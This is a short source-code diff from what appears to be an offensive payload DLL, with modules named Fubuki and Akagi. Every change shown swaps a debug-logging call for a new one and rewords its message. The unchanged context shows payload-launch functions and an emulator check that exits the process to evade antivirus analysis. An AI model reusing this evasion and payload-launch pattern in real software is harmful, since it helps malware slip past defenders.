@@ -53,7 +53,7 @@ VOID DefaultPayload(
     PWSTR lpParameter;
     ULONG cbParameter;
 
-    ucmDbgMsg(LoadedMsg);
+    ucmLogDbgMsg(FubukiLoadedMsg);
 
     //
     // Read shared params block.
@@ -61,24 +61,24 @@ VOID DefaultPayload(
     RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
     bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
     if (bSharedParamsReadOk) {
-        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");
+        ucmLogDbgMsg(L"[Fubuki] ucmReadSharedParameters OK\r\n");
 
         lpParameter = g_SharedParams.szParameter;
         cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
     }
     else {
-        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
+        ucmLogDbgMsg(L"[Fubuki] ucmReadSharedParameters Failed\r\n");
         lpParameter = NULL;
         cbParameter = 0UL;
     }
 
-    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");
+    ucmLogDbgMsg(L"[Fubuki] Before ucmLaunchPayload\r\n");
 
     ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);
 
-    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");
+    ucmLogDbgMsg(L"[Fubuki] After ucmLaunchPayload\r\n");
     if (ExitCode == 0) {
-        ucmDbgMsg(L"Fubuki, ucmLaunchPayload failed\r\n");
+        ucmLogDbgMsg(L"[Fubuki] ucmLaunchPayload failed\r\n");
     }
 
     //
@@ -93,7 +93,7 @@ VOID DefaultPayload(
     // Notify Akagi.
     //
     if (bSharedParamsReadOk) {
-        ucmDbgMsg(L"Fubuki, completion\r\n");
+        ucmLogDbgMsg(L"[Fubuki] Akagi notification\r\n");
         ucmSetCompletion(g_SharedParams.szSignalObject);
     }
 
@@ -331,7 +331,7 @@ BOOL WINAPI EntryPointSxsConsent(
 
     UNREFERENCED_PARAMETER(lpvReserved);
 
-    ucmDbgMsg(LoadedMsg);
+    ucmLogDbgMsg(FubukiLoadedMsg);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
         RtlExitUserProcess('foff');
@@ -391,7 +391,7 @@ BOOL WINAPI EntryPointR41N3RZUF477(
 
     UNREFERENCED_PARAMETER(lpvReserved);
 
-    ucmDbgMsg(LoadedMsg);
+    ucmLogDbgMsg(FubukiLoadedMsg);
 
     if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
         RtlExitUserProcess('foff');
@@ -420,6 +420,7 @@ BOOL WINAPI EntryPointR41N3RZUF477(
         }
 
         if (lpTask && lpOpLockFile) {
+            ucmLogDbgMsg(L"[Fubuki] Before ucmLaunchPayload3\r\n");
             ucmLaunchPayload3(g_SharedParams.MethodId, lpParameter, cbParameter, lpOpLockFile, lpTask);
         }
 
